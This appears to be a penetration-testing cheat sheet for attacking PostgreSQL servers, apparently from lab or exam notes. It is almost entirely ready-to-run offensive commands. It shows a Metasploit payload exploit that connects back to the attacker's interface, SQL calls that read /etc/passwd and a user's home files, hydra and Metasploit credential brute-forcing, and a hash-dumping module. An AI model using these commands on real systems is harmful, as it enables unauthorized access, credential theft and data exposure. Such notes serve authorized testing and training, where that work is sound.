# <span style="color:#FF5555">Commands</span>
### <span style="color:#50FA7B">Exploitation via Metasploit:</span>
`5437/tcp open   postgresql   PostgreSQL DB 11.3 - 11.7`
```bash
use exploit(linux/postgres/postgres_payload)
set RHOST $VICTIM_IP
set RPORT 5437
set LHOST tun0
run
```
### <span style="color:#50FA7B">Manual Access via psql:</span>
```bash
psql -U postgres -p 5437 -h $VICTIM_IP
```

###
```bash
SELECT pg_ls_dir('./');
SELECT pg_ls_dir('/etc/passwd');
SELECT pg_ls_dir('/home/wilson');
SELECT pg_read_file('/home/wilson/local.txt');
```

### <span style="color:#50FA7B">Brute Force Credentials</span>
```bash
hydra -l username -P passwords.txt $VICTIM_IP postgres
hydra -L usernames.txt -p password $VICTIM_IP postgres

# Metasploit
msfconsole
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts $VICTIM_IP
msf> run
```

### <span style="color:#50FA7B">Dump User Hashes</span>
```bash
msfconsole
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> set rhosts $VICTIM_IP
msf> set username $USER
msf> set password $PASS
msf> run
```

## <span style="color:#8BE9FD">Config File</span>
```bash
# Version 14.x
/etc/postgresql/14/main/postgresql.conf
# Version 15.x
/etc/postgresql/15/main/postgresql.conf
```
